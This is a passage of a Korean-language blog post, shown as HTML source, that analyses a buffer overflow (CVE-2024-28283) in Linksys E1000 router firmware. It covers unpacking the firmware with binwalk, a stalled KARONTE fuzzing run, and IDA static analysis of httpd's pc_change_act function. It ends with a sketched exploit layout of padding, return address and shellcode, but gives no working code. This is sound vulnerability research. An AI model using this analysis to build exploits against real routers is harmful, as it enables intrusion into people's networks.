    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ip&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;log&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;qemu-arm-static&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;var_ord&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;glob_var&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;arch&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;only_string&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;False&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;위 내용을 확실히 이해하려면 레포의 key 별 설명(&lt;a href=&quot;https://github.com/ucsb-seclab/karonte/tree/master/config&quot;&gt;https://github.com/ucsb-seclab/karonte/tree/master/config&lt;/a&gt;) 을 읽으면 되는데, 사실 보면 무엇을 참조해 분석하는지 직관적으로 알 수 있으므로 자세한 설명은 하지 않는다.&lt;/p&gt;

&lt;p&gt;내가 실행중인 docker 컨테이너에는 firmware 디렉토리에 firmware dataset이 있는데, 위 json이 참조하는 분석 대상에 저장된 dataset은 이미 unpack이 되어 있는 형태다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%206.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;나보고 unpack해서 넣어놓으라는 소리 같다.&lt;/p&gt;

&lt;p&gt;binwalk로 직접 unpack을 해보고 그 결과물과 비교해보자.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;102-unpack&quot;&gt;1.0.2. unpack&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;gt;docker cp ./FW_E1000_2.1.03.005_US_20140321.bin karonte:/&lt;/code&gt;  명령어로 대상 펌웨어를 컨테이너로 전송했다.&lt;/p&gt;

&lt;p&gt;그리고 아래와 같이 binwalk를 활용해 unpack했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%207.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그러나 아래와 같은 에러가 발생했다.&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
Extractor.execute failed to run external extractor &apos;sasquatch -p 1 -le -d &apos;%%squashfs-root%%&apos; &apos;%e&apos;&apos;: [Errno 2] No such file or directory

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;찾아보니, squashfs 파일시스템과 관련해서만 해당 에러가 생기는 것으로 추정되며, sasquatch 모듈을 따로 설치해 해결할 수 있다고 한다. (https://github.com/threadexio/sasquatch.git)&lt;/p&gt;

&lt;p&gt;설치해서 추출해 보니, 아래와 같이 문제없이 완료되었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%208.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;추출된 .extracted 디렉토리를, 위의 config에 나온 내용(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/firmware/NETGEAR/analyzed/R6200v2-V1.0.3.12_10.1.11/fw/&lt;/code&gt;)을 참고하여 이동해 두었다.&lt;/p&gt;

&lt;p&gt;위의 이동을 반영한 config 파일은 아래와 같이 생성했다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;pickle_parsers&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./pickles/parser/Linksys/Linksys/analyzed/E1000/fw/_FW_E1000_2.1.03.005_US_20140321.bin.extracted/squashfs-root.pk&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;stats&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;False&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;data_keys&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;base_addr&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;eg_source_addr&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;fw_path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./firmware/Linksys/analyzed/E1000/fw/_FW_E1000_2.1.03.005_US_20140321.bin.extracted/squashfs-root&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;angr_explode_bins&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;openvpn&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wpa_supplicant&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;vpn&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;dns&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ip&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;log&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;qemu-arm-static&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;var_ord&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;glob_var&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;arch&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;only_string&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;False&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그리고 아래와 같이 KARONTE를 run 했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%209.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그러나 Border Binaries Discovery 단계에서 더 이상 넘어가지 못했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2010.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;네트워크와 상호작용하는 바이너리를 BBD에서 찾아낸다고 했는데…. 무슨 문제인지 모르겠다.&lt;/p&gt;

&lt;p&gt;올바르게 config을 해야 하나 싶은데, 어떻게 해야 할지 더 고민해 봐야 할 것 같다.&lt;/p&gt;

&lt;p&gt;만약 퍼징으로 찾지 못한 취약점이라면, reporter는 어떤 경로로 이 취약점을 찾았을까?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;11-정적-분석&quot;&gt;1.1. 정적 분석&lt;/h2&gt;

&lt;h3 id=&quot;110-분석-대상-파일-찾기&quot;&gt;1.1.0. 분석 대상 파일 찾기&lt;/h3&gt;

&lt;p&gt;일단 취약점이 발생한 파일인 httpd 파일을 찾아야 한다.&lt;/p&gt;

&lt;p&gt;httpd면 apache 웹서버인가? 보통 이건 /etc/httpd 디렉토리 형태로 떨어지는데.&lt;/p&gt;

&lt;p&gt;바이너리 형태로 떨어진 거면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/sbin&lt;/code&gt; ,  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin&lt;/code&gt; ,  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/sbin&lt;/code&gt; 중 하나에는 있겠다 생각했다.&lt;/p&gt;

&lt;p&gt;그렇게 생각하고 찾아보니, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/sbin/&lt;/code&gt;에서 찾을 수 있었다.&lt;/p&gt;

&lt;p&gt;이렇게 휴리스틱한 방식 말고 다른 방법으로도 찾을 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;구글링
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;httpd firmware를 검색하면 아래와 같이 펌웨어상의 httpd 바이너리에서 발생한 CVE 분석 글이 있다.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2011.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;해당 CVE는 netgear 라우터에서 발생한 취약점이다. 지금 분석 대상 펌웨어 또한 라우터 펌웨어인 점을 고려했을 때, 비슷한 OS 및 시스템 구조를 차용하고 있을 가능성이 높으므로 그대로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/sbin&lt;/code&gt;을 찾아보면 httpd 파일을 찾을 수 있었을 것이다.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;everything
    &lt;ol&gt;
      &lt;li&gt;제일 쉽긴 한데 한 10분 기다려야 한다.&lt;/li&gt;
      &lt;li&gt;everything 유틸리티가 추출한 펌웨어 파일시스템에 대해 분석을 해야 하기 때문에…&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;그래도 검색하면 이렇게 httpd를 찾을 수 있다.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2012.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;111-분석&quot;&gt;1.1.1. 분석&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;pc_change_act&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;IDA에 넣고 띄운 다음 function 이름(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pc_change_act&lt;/code&gt;)으로 검색했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2013.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;문제의 조건과 완전히 일치하는 함수임을 알 수 있었다.&lt;/p&gt;

&lt;p&gt;이쪽에서 보이는 문자열들은 보통 라우터를 관리 및 설정할 때 보내는 설정키밸류의 키값인 것으로 보인다.&lt;/p&gt;

&lt;p&gt;왜냐하면 라우터 펌웨어라는 점을 고려했을 때 WTP는 Wireless Transcation Protocol의 약자인 것 같고, 보통 이런 형식의 문자열이면 라우터 관리변경 시에 사용하는 환경변수 값이고,&lt;/p&gt;

&lt;p&gt;위의 생각에 근거해 linksys pc_enable로 검색해 보니, 아래와 같이 nvram info의 키값 중 하나인 점이 확인되었기 때문이다.(스크롤이 너무 길어 PC_enable은 안 보임)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2014.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그럼 이제 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pc_change_act&lt;/code&gt; 함수를 들여다 보자.&lt;/p&gt;

&lt;p&gt;문제에서는 힌트로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_cgi&lt;/code&gt;를 언급했는데, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_cgi&lt;/code&gt;의 xref를 보면 매우 많은 점을 알 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2015.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이런 상황에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_cgi&lt;/code&gt;를 루트커즈로 판단하는 것은 논리적으로 틀린 추측이 된다.&lt;/p&gt;

&lt;p&gt;그보다는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_cgi&lt;/code&gt;의 값을 내부적으로 처리하는 과정에서 문제가 생겼다고 보는 것이 맞고, 따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pc_change_act&lt;/code&gt; 함수에 루트커즈가 있다고 판단하는 것이 맞다고 생각한다.&lt;/p&gt;

&lt;p&gt;이제 상세하게 내부 데이터 처리 루틴을 파악해 보자.&lt;/p&gt;

&lt;p&gt;먼저 해당 함수의 내부에서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sscanf&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sprintf&lt;/code&gt;를 사용하고 있는 것이 보인다.&lt;/p&gt;

&lt;p&gt;그러나 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sscanf&lt;/code&gt;를 보면 펌웨어가 작동 중인 정보시스템 외부의 값이 활용될 여지가 낮아 보인다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nvram_get&lt;/code&gt; 함수는 “TMSSS_enable” nvram 엔트리에서 value를 가져오는데, 비록 이게 user controlled data이지만 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sscanf&lt;/code&gt;에서 %d로 핸들링하기 때문에 RCE로 이어질 가능성이 낮기 때문이다.&lt;/p&gt;

&lt;p&gt;따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sprintf&lt;/code&gt;에 집중했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2016.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;v5는 24byte 크기 배열인데, 설정 파라미터 키값을 데이터 처리 파라미터로 썼기 때문에 user controlled data인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PC_enable&lt;/code&gt;의 value를 리턴할 가능성이 높은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_cgi(”PC_enable”)&lt;/code&gt;의 값을 그대로 복사해 받는다.&lt;/p&gt;

&lt;p&gt;BOF가 의심되는 정황이다.&lt;/p&gt;

&lt;p&gt;따라서 함수를 타고 들어가며 추측이 맞는지 더 정확히 알아보았다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;get_cgi&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2017.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_cgi&lt;/code&gt; 내부에서 0이 아닌 다른 값을 리턴하려면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_xss&lt;/code&gt;가 콜되어야 한다.&lt;/p&gt;

&lt;p&gt;눈치상 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hsearch_r&lt;/code&gt;에서 v3과 a1을 근거로 검색을 수행해서, 별 문제 없으면 v4가 a1(“PC_enable”의 시작주소)를 가리킬 것 같다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;get_xss&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2018.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;보안 조치인 것 같다. XSS 유발하는 code signature가 있는지 판단하는 것으로 보이는데,&lt;/p&gt;

&lt;p&gt;리턴값이 유의미한 값이 되기 위해서는 if 문이 false가 되고 v2가 리턴되는 플로우가 진행되어야 한다. 즉, XSS 문제가 없는 입력값이어야 한다.&lt;/p&gt;

&lt;p&gt;그렇다면 뭐가 v2에 값을 할당하는가? if 문의 가장 마지막 조건이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strstr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;&amp;amp;nbsp;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;위 조건에 대한 검사를 거치고 나면 v2에는 a1이 저장된다.&lt;/p&gt;

&lt;p&gt;즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_cgi&lt;/code&gt;에 인수로 준 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PC_enable&lt;/code&gt;의 시작주소가 그대로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pc_change_act&lt;/code&gt;의 변수 cgi에 들어간다.&lt;/p&gt;

&lt;p&gt;해당 바이너리(httpd)는 gcc-compiled c/c++ 바이너리다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2019.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;40%&quot; height=&quot;40%&quot; /&gt; &lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2020.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;40%&quot; height=&quot;40%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2021.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;40%&quot; height=&quot;400%&quot; /&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2022.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;40%&quot; height=&quot;40%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;위와 같이 IDA에서 확인된 정보와 컴파일러의 convention 등을 고려했을 때,&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;30byte+RET addr+shellcode&lt;/code&gt; 로 주면 익스플로잇이 될 것처럼 보인다. 물론 RCE를 하고 싶으면 NX-bit 등이 걸려있는지 확인해야 하지만&lt;/p&gt;

